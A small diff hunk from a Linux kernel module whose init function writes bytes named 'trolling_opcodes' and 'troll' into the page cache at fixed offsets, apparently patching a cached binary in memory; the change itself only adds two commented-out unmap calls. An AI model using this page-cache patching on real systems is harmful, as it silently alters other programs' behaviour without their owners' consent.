@@ -35,6 +35,8 @@ int init_module(void)
   //unmap_page(i, 0x00107c10);
   write_string_page_cache(i, 0x00107c10, trolling_opcodes, 21);
   write_string_page_cache(i, 0x00191027, troll, 8);
+  //unmap_page(i, 0x00107c10);
+  //unmap_page(i, 0x00191027);
   return 0;
 }
 
